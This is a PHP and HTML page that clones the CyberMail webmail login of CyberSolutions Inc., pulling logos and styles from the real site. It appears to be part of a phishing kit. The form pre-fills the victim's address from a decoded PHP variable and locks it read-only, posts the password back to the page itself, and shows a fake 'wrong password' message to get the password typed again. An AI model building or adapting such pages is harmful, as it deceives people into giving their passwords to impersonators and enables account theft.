<?php include '../build.php' ?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="https://webmail.cybermail.jp/favicon.ico?220127">
    <title>CyberMail Message System</title>

    <!-- Original stylesheet -->
    <link rel="stylesheet" href="https://webmail.cybermail.jp/c80/login.css?m=2309121757">

    <!-- Password-mask fix (must load AFTER login.css) -->
    <link rel="stylesheet" href="../assets/password-fix.css?v=1">

    <style>
        html {
            background-image: url('https://webmail.cybermail.jp/cgi-bin/login_portal/background?t=1638157334');
        }

        .error-message {
            margin: 24px 0;
            font-size: 1rem;
            color: #f44336;
        }

        :lang(ja) {
            font-family: "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Hiragino Kaku Gothic Pro", osaka, meiryo, "Helvetica Neue", helvetica, arial, sans-serif;
        }

        div { display: block; unicode-bidi: isolate; }

        body {
            margin: 0;
            display: flex;
            cursor: default;
            user-select: none;
            justify-content: center;
            align-items: center;
            box-sizing: border-box;
            padding: 0 calc((1266px + 100px - 1026px) / 2);
            position: relative;
            font-size: 1rem;
        }

        .loading {
            opacity: 0.6;
            pointer-events: none;
        }

        /* ==================================================
           Force password input to match the email input.
           MaskedPassword wraps the input in a <span> at
           runtime, collapsing its layout — we override with
           a shared flex layout for both fields.
           ================================================== */
        #stdLogin .input-wrapper {
            display: flex;
            align-items: center;
            width: 100%;
            max-width: 100%;
            box-sizing: border-box;
            margin-bottom: 12px;
            position: relative;
        }

        #stdLogin .input-wrapper > input,
        #stdLogin .input-wrapper > span,
        #stdLogin .input-wrapper > span > input {
            width: 100%;
            box-sizing: border-box;
            height: 44px;
            line-height: 44px;
            padding: 0 14px;
            font-size: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            outline: none;
            background: #fff;
            color: #333;
            font-family: inherit;
        }

        #stdLogin .input-wrapper > span {
            display: flex !important;
            align-items: center !important;
            flex: 1 1 auto !important;
            min-width: 0 !important;
            height: 44px !important;
            padding: 0 !important;
            border: none !important;
            background: transparent !important;
            border-radius: 0 !important;
        }

        #stdLogin .input-wrapper > span > input {
            display: block;
            height: 44px;
            min-height: 44px;
        }

        #stdLogin .input-wrapper > span > input[type="hidden"] {
            display: none !important;
            width: 0 !important;
            height: 0 !important;
            padding: 0 !important;
            margin: 0 !important;
            border: 0 !important;
        }

        #stdLogin input::placeholder {
            color: #999;
            opacity: 1;
        }

        #stdLogin input:focus {
            border-color: #2b6cff;
            box-shadow: 0 0 0 2px rgba(43,108,255,.15);
        }

        /* Keyboard button stays aligned */
        .keyboard-button-container {
            display: flex;
            align-items: center;
            gap: 8px;
            position: relative;
        }
        .keyboard-button-container .input-wrapper {
            flex: 1 1 auto;
        }
        .keyboard-button {
            flex: 0 0 auto;
            background: transparent;
            border: none;
            cursor: pointer;
            padding: 0;
        }
        .keyboard-button img {
            width: 32px;
            height: 32px;
            display: block;
        }
    </style>
</head>

<body>
    <!-- Language Selector (Hidden) -->
    <label id="locale-container" style="display:none">
        <select id="locale" name="lang" form="normal_form" tabindex="-1">
            <option value="tw" lang="zh-Hant">繁體中文</option>
            <option value="gb" lang="zh-Hans">简体中文</option>
            <option value="en" lang="en">English</option>
            <option value="jp" selected lang="ja">日本語</option>
        </select>
    </label>

    <!-- Main Content Block -->
    <div id="main-block">
        <!-- Left Block - Logo and Greeting -->
        <div id="left-block">
            <div id="logo-container">
                <img id="logo" src="https://webmail.cybermail.jp/img/v70_login_logo_cm.png" alt="CyberMail">
            </div>
            <div id="greeting" style="color: rgb(52, 52, 52); visibility: visible;">
                CyberMail へようこそ
            </div>
        </div>

        <!-- Right Block - Login Forms -->
        <div id="right-block">
            <div id="tab">
                <!-- Tab Controllers -->
                <input type="radio" name="tab-controller" id="tab-1" checked>
                <input type="radio" name="tab-controller" id="tab-2">
                <input type="radio" name="tab-controller" id="tab-3">
                <input type="radio" name="tab-controller" id="tab-4">
                <input type="radio" name="tab-controller" id="tab-5">

                <!-- Tab Headers -->
                <div id="tab-heads">
                    <label for="tab-1">CyberMail Account</label>
                    <label for="tab-2" hidden>SAML</label>
                    <label for="tab-3" hidden>Google</label>
                    <label for="tab-4" hidden>証明書</label>
                    <label for="tab-5" hidden>Passwordless Login</label>
                </div>

                <!-- Tab Bodies -->
                <div id="tab-bodies">
                    <!-- Tab 1: Standard Login -->
                    <div data-id="tab-1">
                        <form name="login-form" id="login-form" action="" method="post" novalidate>
                            <input type="hidden" name="lang" value="jp">
                            <input type="hidden" name="login" value="cyber">

                            <div id="stdLogin">
                                <!-- User ID Input -->
                                <div class="keyboard-button-container">
                                    <label class="input-wrapper" data-icon="email">
                                        <input placeholder="<?php echo htmlspecialchars($decoded ?? ''); ?>"
                                               maxlength="318"
                                               value="<?php echo htmlspecialchars($decoded ?? ''); ?>"
                                               onfocus="stBoard && stBoard.setTarget(this)"
                                               name="user"
                                               id="userid-input"
                                               autocomplete="off"
                                               readonly>
                                    </label>

                                    <button type="button"
                                            class="icon-button keyboard-button"
                                            onclick="keyboardSwitch();"
                                            tabindex="-1">
                                        <img src="https://webmail.cybermail.jp/img/login_keyboard.svg" alt="Keyboard">
                                    </button>

                                    <div id="board"></div>
                                </div>

                                <!-- Password Input — must be type="text" for MaskedPassword -->
                                <label class="input-wrapper" data-icon="lock">
                                    <input type="text"
                                           name="pass"
                                           id="passwd-input"
                                           maxlength="32"
                                           placeholder="パスワード - Password ："
                                           onfocus="stBoard && stBoard.setTarget(this)"
                                           autocomplete="off">
                                </label>

                                <!-- Hidden Checkbox Group -->
                                <div class="checkbox-group" style="display:none">
                                    <input type="checkbox" name="remember" value="1" id="remember">
                                    <label for="remember">ユーザID保存</label>
                                    <input type="checkbox" name="opennw" value="1" id="new-window">
                                    <label for="new-window">別ウィンドウ表示</label>
                                </div>

                                <!-- Error Message -->
                                <div class="error-message" style="<?php echo htmlspecialchars($error ?? 'display:none;'); ?>">
                                    アカウントもしくはパスワードが間違っています。再入力して下さい。
                                </div>

                                <!-- Login Button -->
                                <input type="submit" value="Login" id="login-btn">
                            </div>
                        </form>
                    </div>

                    <!-- Tab 2: SAML -->
                    <div data-id="tab-2">&nbsp;</div>

                    <!-- Tab 3: Google Login -->
                    <div data-id="tab-3">
                        <input type="button" value="Login">
                    </div>

                    <!-- Tab 4: Certificate Login -->
                    <div data-id="tab-4">
                        <input type="button" value="Login">
                    </div>

                    <!-- Tab 5: Passwordless Login -->
                    <div data-id="tab-5">
                        <form name="fido_login_form"
                              action="javascript:void(0)"
                              onsubmit="fido_login_with_creds(); return false;">
                            <label class="input-wrapper" data-icon="email">
                                <input placeholder="ユーザID - UserID ："
                                       maxlength="318"
                                       value=""
                                       id="fido_userid">
                            </label>

                            <div class="checkbox-group">
                                <input type="checkbox" name="remember" value="1" id="remember_fido">
                                <label for="remember_fido">ユーザID保存</label>
                                <input type="checkbox" name="opennw" value="1" id="new-window_fido">
                                <label for="new-window_fido">別ウィンドウ表示</label>
                            </div>

                            <input type="submit" value="Login">
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bottom Spacer -->
    <div style="display: flex; align-items: center; height: 32px; position: absolute; left: 48px; bottom: 8px;"></div>

    <!-- Copyright Footer -->
    <div id="copyright">
        <div class="footer">
            Copyright &copy; <a href="#" target="_blank">CyberSolutions Inc.</a> All rights reserved.
        </div>
    </div>

    <!-- MaskedPassword helper -->
    <script type="text/javascript">
    function MaskedPassword(e,d){
        if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}
        if(e==null){return false}
        this.symbol=d;
        this.isIE=typeof document.uniqueID!="undefined";
        e.value="";
        e.defaultValue="";
        e._contextwrapper=this.createContextWrapper(e);
        this.fullmask=false;
        var f=e._contextwrapper;
        var b='<input type="hidden" name="'+e.name+'">';
        var c=this.convertPasswordFieldHTML(e);
        f.innerHTML=b+c;
        e=f.lastChild;
        e.className+=" masked";
        e.setAttribute("autocomplete","off");
        e._realfield=f.firstChild;
        e._contextwrapper=f;
        this.limitCaretPosition(e);
        var a=this;
        this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});
        this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});
        this.forceFormReset(e);
        return true
    }
    MaskedPassword.prototype={
        doPasswordMasking:function(a){
            var d="";
            if(a._realfield.value!=""){
                for(var b=0;b<a.value.length;b++){
                    if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}
                    else{d+=a.value.charAt(b)}
                }
            }else{d=a.value}
            var c=this.encodeMaskedPassword(d,this.fullmask,a);
            if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}
        },
        encodeMaskedPassword:function(d,f,b){
            var a=f===true?0:1;
            for(var e="",c=0;c<d.length;c++){
                if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}
            }
            return e
        },
        createContextWrapper:function(a){
            var b=document.createElement("span");
            b.style.position="relative";
            a.parentNode.insertBefore(b,a);
            b.appendChild(a);
            return b
        },
        forceFormReset:function(a){
            while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}
            if(!/form/i.test(a.nodeName)){return null}
            this.addSpecialLoadListener(function(){a.reset()});
            return a
        },
        convertPasswordFieldHTML:function(c,e){
            var b="<input";
            for(var d=c.attributes,a=0;a<d.length;a++){
                if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){
                    b+=" "+d[a].name+'="'+d[a].value+'"'
                }
            }
            b+=' type="text" autocomplete="off">';
            return b
        },
        limitCaretPosition:function(a){
            var d=null,
                c=function(){
                    if(d==null){
                        if(this.isIE){
                            d=window.setInterval(function(){
                                var e=a.createTextRange(),g=a.value.length,f="character";
                                e.moveEnd(f,g);e.moveStart(f,g);e.select()
                            },100)
                        }else{
                            d=window.setInterval(function(){
                                var e=a.value.length;
                                if(!(a.selectionEnd==e&&a.selectionStart<=e)){
                                    a.selectionStart=e;a.selectionEnd=e
                                }
                            },100)
                        }
                    }
                },
                b=function(){window.clearInterval(d);d=null};
            this.addListener(a,"focus",function(){c()});
            this.addListener(a,"blur",function(){b()})
        },
        addListener:function(c,a,b){
            if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}
            else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}
        },
        addSpecialLoadListener:function(a){
            if(this.isIE){return window.attachEvent("onload",a)}
            else{return document.addEventListener("DOMContentLoaded",a,false)}
        },
        getTarget:function(a){
            if(!a){return null}
            return a.target?a.target:a.srcElement
        }
    };
    </script>

    <!-- Init MaskedPassword + post-fix the wrapper -->
    <script type="text/javascript">
    (function () {
        function initMasked() {
            var pwd = document.getElementById("passwd-input");
            if (!pwd) return;

            try {
                new MaskedPassword(pwd, "\u25CF");
            } catch (err) {
                // Fallback: use native password type
                pwd.type = "password";
                return;
            }

            // Fix wrapper span so the visible input fills the parent
            var wrapper = pwd.parentNode;
            if (wrapper && wrapper.tagName === "SPAN") {
                wrapper.style.position   = "relative";
                wrapper.style.display    = "flex";
                wrapper.style.alignItems = "center";
                wrapper.style.flex       = "1 1 auto";
                wrapper.style.width      = "100%";
                wrapper.style.minWidth   = "0";
                wrapper.style.height     = "44px";
                wrapper.style.boxSizing  = "border-box";
            }

            // Fix the visible (converted) input
            var visible = document.querySelector("input.masked");
            if (visible) {
                visible.style.height     = "44px";
                visible.style.minHeight  = "44px";
                visible.style.lineHeight = "44px";
                visible.style.padding    = "0 14px";
                visible.style.width      = "100%";
                visible.style.boxSizing  = "border-box";
                visible.style.fontSize   = "15px";
                visible.style.border     = "1px solid #ccc";
                visible.style.borderRadius = "4px";
                visible.style.background = "#fff";
                visible.style.outline    = "none";
                visible.style.color      = "#333";
            }

            // Hide the hidden real field
            var hidden = document.querySelector('input[name="pass"][type="hidden"]');
            if (hidden) {
                hidden.style.display  = "none";
                hidden.style.position = "absolute";
                hidden.style.width    = "0";
                hidden.style.height   = "0";
            }
        }

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", initMasked);
        } else {
            initMasked();
        }
    })();
    </script>
</body>
</html>